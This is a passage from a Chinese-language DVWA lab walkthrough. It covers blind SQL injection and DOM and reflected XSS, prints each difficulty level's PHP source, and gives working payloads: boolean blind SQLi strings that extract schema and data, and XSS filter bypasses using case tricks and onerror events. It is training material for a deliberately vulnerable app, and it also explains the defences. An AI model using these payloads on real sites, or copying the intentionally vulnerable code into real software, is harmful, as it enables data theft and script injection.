class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$exists</span>) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>中级难度下，提交方式变为下拉id提交，使用post提交，并且使用mysqli_real_escape_string函数对单引号双引号反斜杠等进行了转义处理。和low的普通方式差不多但需要抓包构造语句使用post提交<br>四种语句还是类似并且和low的过程相似。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1 #<br>1 and (select ascii(substr(database(),1,1)) = 114) #<br>1 and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) = 103) #<br>1 and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) = 99) #<br>1 and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) = 49) #<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-59-30.png" alt="测试" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_COOKIE</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_COOKIE</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_DVWA</span>[<span class="hljs-string">&#x27;SQLI_DB&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-comment">// Check database limit限制只能查一条数据</span><br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span><br><br>            <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> !== <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-comment">// Get results</span><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-variable">$exists</span> = (mysqli_num_rows( <span class="hljs-variable">$result</span> ) &gt; <span class="hljs-number">0</span>); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors</span><br>                &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br><br>            ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SQLITE:<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$sqlite_db_connection</span>;<br><br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-variable">$results</span> = <span class="hljs-variable">$sqlite_db_connection</span>-&gt;query(<span class="hljs-variable">$query</span>);<br>                <span class="hljs-variable">$row</span> = <span class="hljs-variable">$results</span>-&gt;fetchArray();<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-variable">$row</span> !== <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$exists</span>) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Might sleep a random amount 报错的话会执行延迟函数</span><br>        <span class="hljs-keyword">if</span>( rand( <span class="hljs-number">0</span>, <span class="hljs-number">5</span> ) == <span class="hljs-number">3</span> ) &#123;<br>            sleep( rand( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );<br>        &#125;<br><br>        <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span><br>        header( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>high级别的盲注加入了sleep函数对时间盲注造成干扰，将数据提交页面和结果显示也页面分离，一定程度上约束了sqlmap自动化工具的常规方式但无法完全阻挡，利用set-cookie对输入的值进行传递到显示页面的cookie字段中保存，sql语句添加limit限制每次输出只有结果的一个记录，不会输出所有纪录。</p>
<p>漏洞复现：<br>对于limit限制输出记录数目可以利用#注释限制，服务端会随机执行sleep函数，做执行延迟时间2-4秒会对时间延迟盲注有干扰，因此可以考虑布尔盲注测试<br>可以参考low级别的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1&#x27; #<br>1&#x27; and (select ascii(substr(database(),1,1)) = 114) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) = 103) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) = 99) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) = 49) #<br></code></pre></td></tr></table></figure>

<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token 加入token机制</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br>    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Was a number entered? 对传入的id进行判断是否为数字 并且使用了limit 1做了限制 使用了PDO</span><br>    <span class="hljs-keyword">if</span>(is_numeric( <span class="hljs-variable">$id</span> )) &#123;<br>        <span class="hljs-variable">$id</span> = intval (<span class="hljs-variable">$id</span>);<br>        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_DVWA</span>[<span class="hljs-string">&#x27;SQLI_DB&#x27;</span>]) &#123;<br>            <span class="hljs-keyword">case</span> MYSQL:<br>                <span class="hljs-comment">// Check the database</span><br>                <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<br>                <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::PARAM_INT );<br>                <span class="hljs-variable">$data</span>-&gt;execute();<br><br>                <span class="hljs-variable">$exists</span> = <span class="hljs-variable">$data</span>-&gt;rowCount();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> SQLITE:<br>                <span class="hljs-keyword">global</span> <span class="hljs-variable">$sqlite_db_connection</span>;<br><br>                <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$sqlite_db_connection</span>-&gt;prepare(<span class="hljs-string">&#x27;SELECT COUNT(first_name) AS numrows FROM users WHERE user_id = :id LIMIT 1;&#x27;</span> );<br>                <span class="hljs-variable">$stmt</span>-&gt;bindValue(<span class="hljs-string">&#x27;:id&#x27;</span>,<span class="hljs-variable">$id</span>,SQLITE3_INTEGER);<br>                <span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;execute();<br>                <span class="hljs-variable">$result</span>-&gt;finalize();<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> !== <span class="hljs-literal">false</span>) &#123;<br>                    <span class="hljs-comment">// There is no way to get the number of rows returned</span><br>                    <span class="hljs-comment">// This checks the number of columns (not rows) just</span><br>                    <span class="hljs-comment">// as a precaution, but it won&#x27;t stop someone dumping</span><br>                    <span class="hljs-comment">// multiple rows and viewing them one at a time.</span><br><br>                    <span class="hljs-variable">$num_columns</span> = <span class="hljs-variable">$result</span>-&gt;numColumns();<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num_columns</span> == <span class="hljs-number">1</span>) &#123;<br>                        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetchArray();<br><br>                        <span class="hljs-variable">$numrows</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;numrows&#x27;</span> ];<br>                        <span class="hljs-variable">$exists</span> = (<span class="hljs-variable">$numrows</span> == <span class="hljs-number">1</span>);<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$exists</span>) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span><br>        header( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这个级别采用了PDO技术划清了代码于数据的界限有效的提高了防御sql注入，加入了token机制进一步提高了安全性，采用参数化查询而非动态查询，对代码和数据进行了分离。只有返回的查询结果数量为一个记录时才会成功输出，有效预防了暴库，使用is_numeric函数来判断是否为数字满足条件才查询。</p>
<h2 id="DVWA-–-XSS-DOM"><a href="#DVWA-–-XSS-DOM" class="headerlink" title="DVWA – XSS(DOM)"></a>DVWA – XSS(DOM)</h2><p>XSS全程跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意脚本代码当受害者访问该页面恶意代码就会在浏览器上执行，需要强点的是，xss不仅限于JavaScript，还包括flash等其他脚本语言，根据恶意代码是否存储在服务器中又分为存储型和反射型。<br>DOM——base XSS漏洞基于文档对象模型的一种漏洞。dom是一个与平台编程语言无关的接口，它允许程序或脚本动态访问和更新文档内容，结构和样式，处理后的结果能作为页面的一部分。dom中有很多对象，其中一些可以用户操作如url、location、refelter等。客户端脚本程序可以通过dom动态修改页面内容，不依赖于提交数据到服务器，而是从客户端获得数据在本地执行，如果dom中的数据没有经过严格确认就会产生dom型xss漏洞</p>
<p>可能触发dom型xss的属性：document.referer属性、window.name属性、location属性、innerhtml属性、document.write属性</p>
<p>XSS(dom)主题:<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-11-55-06.png" alt="dom型xss" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>没有保护，什么都没有<br><span class="hljs-comment"># No protections, anything goes</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>直接进行弹窗测<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-11-58-27.png" alt="弹窗" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">array_key_exists()检查键是否存在</span><br><span class="hljs-comment">array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。</span><br><span class="hljs-comment">提示：如果指定数组的时候省略了键名，将会生成从 0 开始并以 1 递增的整数键名</span><br><span class="hljs-comment">array_key_exists(key,array)</span><br><span class="hljs-comment">key 必需    规定键名。</span><br><span class="hljs-comment">array    必需。规定数组</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> ( array_key_exists( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !is_null (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>];<br>    <br>    <span class="hljs-comment"># Do not allow script tags </span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    stripos函数查找字符串在另一字符串中第一次出现的位置不区分大小写</span><br><span class="hljs-comment">    stripos(string,find,start)</span><br><span class="hljs-comment">    string 必需    规定被搜索的字符串。</span><br><span class="hljs-comment">    find 必需    规定要查找的字符。</span><br><span class="hljs-comment">    start 可选    规定开始搜索的位置。</span><br><span class="hljs-comment">    返回值：    返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释：字符串位置从 0 开始，不是从 1 开始。</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">//如果不含script</span><br>    <span class="hljs-keyword">if</span> (stripos (<span class="hljs-variable">$default</span>, <span class="hljs-string">&quot;&lt;script&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        header (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    header() 函数向客户端发送原始的 HTTP 报头</span><br><span class="hljs-comment">    header(string,replace,http_response_code)</span><br><span class="hljs-comment">    string 必需    规定要发送的报头字符串。</span><br><span class="hljs-comment">    replace 可选    指示该报头是否替换之前的报头，或添加第二个报头。</span><br><span class="hljs-comment">    默认是 true（替换）。false（允许相同类型的多个报头）。</span><br><span class="hljs-comment">    http_response_code可选    把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>简单的说就是过滤了&lt;script,当匹配到时就会修正参数为English<br>在这里可以构造onerror事件，在装载文档或图像的过程中如果发生错误就会触发事件构造语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">English&lt;/option&gt;&lt;select&gt;&lt;img src=x onerror=alert(1)&gt;<br></code></pre></td></tr></table></figure>

<p>这里的option标签是通过网页源码拼接的<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-08-15.png" alt="标签的选择" class="lazyload"><br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-09-38.png" alt="成功弹窗" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?php<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( array_key_exists( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !is_null (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br><br>    <span class="hljs-comment"># White list the allowable languages这里设置了百名单只允许这些值通过</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;French&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;English&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;German&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Spanish&quot;</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            header (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里设置了白名单但只对default进行了过滤我们可以用&amp;或者#,在url中#表示书签&amp;表示指定参数之间的分隔符。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-22-25.png" alt="添加标签或者添加参数" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># Don&#x27;t need to do anything, protection handled on the client side</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里设置的我们呢输入的参数全部无效了</p>
<h2 id="DVWA-–-XSS-reflected-反射型"><a href="#DVWA-–-XSS-reflected-反射型" class="headerlink" title="DVWA – XSS(reflected)反射型"></a>DVWA – XSS(reflected)反射型</h2><p>XSS攻击需要具备两个条件：1.需要向web页面注入恶意代码 2.恶意代码可以执行</p>
<p>xss反射型：顾名思义反射是一个一来一回的过程，反射型xss触发有后端的参与，之所以触发xss是因为后端解析前端传来带有xss性质的脚本文件或者脚本的data url编码，后端解析用户输入处理返回前端，由浏览器解析这段xss脚本而触发xss漏洞。因此要避免反射型xss则必须要后端的协调，在后端解析前端数据时首先做相关字串的检测和转义处理；同时前端也要对用户的输入做excape转义，保证数据源可靠性。</p>
<p>基本原理是通过给别人发送带有恶意脚本代码参数的url，当url地址被打开，特定的代码参数就会被html解析，执行这样就可以获取cookie。</p>
<p>特点:非持久化，必须用户输入带有特定参数的连接才能引起。</p>
<p>xss反射性攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个连接到目标网站的恶意链接来实施攻击。</p>
<p>xss(reflected)主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-47-36.png" alt="主题" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-comment">//array_key_exists函数判断变量值中是否存在name键名，且值不为空才输出</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>服务器只是判断了name参数是否为空，如果不为空就直接打印出来，服务器并没有对name参数做任何过滤和检查<br>漏洞复现：<br>直接使用下面的语句尝试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-51-57.png" alt="成功弹窗" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input将script标签置空</span><br>    <span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>会见查name参数中是否含有script标签，有则替换为空，这里使用了str_replace函数他区分大小写因此可以用大小写绕过<br>漏洞复现：<br>这里使用大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">&lt;sCript&gt;alert(1)&lt;/ScRipt&gt;<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-12-56-26.png" alt="绕过成功" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-comment">//这里使用通配符完全匹配script标签所有的script标签全部被过滤</span><br>    <span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>preg_replace()函数执行一个正则表达式的搜索和替换。*代表任意字符i代表不区分大小写。就是说所有的script标签被过滤，单我们可以通过其他标签来绕过如img、body等标签的事件或者iframe标签的是如此注入js脚本攻击<br>漏洞复现：<br><code>&lt;img src=# onerror=alert(2)&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-01-57.png" alt="测试" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token 加入token检验</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        htmlspecialchars函数将符号转码</span><br><span class="hljs-comment">        &amp; （和号） 成为 &amp;amp;</span><br><span class="hljs-comment">        &quot; （双引号） 成为 &amp;quot;</span><br><span class="hljs-comment">        &#x27; （单引号） 成为 &amp;#039;</span><br><span class="hljs-comment">        &lt; （小于） 成为 &amp;lt;</span><br><span class="hljs-comment">        &gt; （大于） 成为 &amp;gt;</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-variable">$name</span> = htmlspecialchars( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>htmlspecialchars函数用于把预定义的一些字符转换为html实体防止了我们注入html标签。例如我们注入 “”，htmlspecialchars 函数会将 &lt; 和 &gt; 转换成 html 实体而不是当做标签，所以我们插入的语句并不会被执行。同时加入 Anti-CSRF token 防护 CSRF 攻击，进一步提高安全性。</p>
<h2 id="DVWA-–XSS-Stored-存储型"><a href="#DVWA-–XSS-Stored-存储型" class="headerlink" title="DVWA –XSS(Stored)存储型"></a>DVWA –XSS(Stored)存储型</h2><p>存储型：攻击者实现将恶意代码上传或者存储到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码，这就意味者只要页面被访问就会被攻击，因此存储型xss危害更大。存储习型xss的代码存在于网页代码中可以说是永久的。</p>
<p>存储型一般存在于留言品论博客日志等交互出，恶意脚本存储到客户端或者服务器的数据库中。</p>
<p>xss(store)主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-42-09.png" alt="存储型xss主题" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
